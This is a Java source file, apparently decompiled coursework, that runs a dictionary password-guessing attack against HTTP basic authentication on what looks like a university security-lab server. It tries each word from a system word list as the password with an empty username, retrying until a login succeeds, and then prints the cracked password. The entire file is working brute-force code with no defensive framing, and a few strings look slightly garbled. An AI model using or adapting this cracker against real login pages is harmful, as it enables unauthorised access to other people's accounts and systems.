import java.io.PrintStream;
import java.net.MalformedURLException;
import java.io.IOException;
import java.io.Reader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.Authenticator;
import java.io.BufferedReader;
import java.net.PasswordAuthentication;
import java.io.FileNotFoundException;
import java.io.FileReader;
public class Dictionary {
    static BufferedReader in;
    static MyAuthenticator Auth;
    public static void main ( final String[] array ) throws IOException {
        int i = 0;
        Authenticator.setDefault ( Dictionary.Auth );
        try {
            final URL url = new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/index.php" );
            while ( i != 1 ) {
                try {
                    Dictionary.in = new BufferedReader ( new InputStreamReader ( url.openStream() ) );
                    i = 1;
                } catch ( IOException ex ) {}
            }
            while ( Dictionary.in.readLine() != null ) {}
            final PrintStream out = System.out;
            final StringBuilder append = new StringBuilder().append ( "The successful Password found using a Dictionary search is = " );
            final MyAuthenticator auth = Dictionary.Auth;
            out.println ( append.append ( MyAuthenticator.finalPass() ).toString() );
        } catch ( MalformedURLException ex2 ) {
            System.out.println ( "mfURL" );
        }
    }
    static {
        Dictionary.in = null;
        Dictionary.Auth = new MyAuthenticator();
    }
}
class MyAuthenticator extends Authenticator {
    String username;
    static String password;
    static String DictFile;
    static BufferedReader fReader;
    public MyAuthenticator() {
        this.username = "";
        try {
            MyAuthenticator.fReader = new BufferedReader ( new FileReader ( MyAuthenticator.DictFile ) );
        } catch ( FileNotFoundException ex ) {
            System.out.println ( "File " + MyAuthenticator.DictFile + " Not Found" );
            System.out.println ( " File Opened" );
            System.exit ( 1 );
        } catch ( IOException ex2 ) {
            System.out.println ( "File  Failed.." );
            System.exit ( 1 );
        }
    }
    static void setPass ( final String password ) {
        MyAuthenticator.password = password;
    }
    static String finalPass() {
        return MyAuthenticator.password;
    }
    static String getPass() {
        try {
            if ( ( MyAuthenticator.password = MyAuthenticator.fReader.readLine() ) == null ) {
                System.out.println ( "Password Not found in file '" + MyAuthenticator.DictFile + "'." );
                System.exit ( 1 );
            }
        } catch ( IOException ex ) {
            System.out.println ( "File IOException" );
            System.out.println ( ex );
        }
        return MyAuthenticator.password;
    }
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        return new PasswordAuthentication ( this.username, getPass().toCharArray() );
    }
    static {
        MyAuthenticator.password = "";
        MyAuthenticator.DictFile = "/usr/share/lib/dict/words";
    }
}
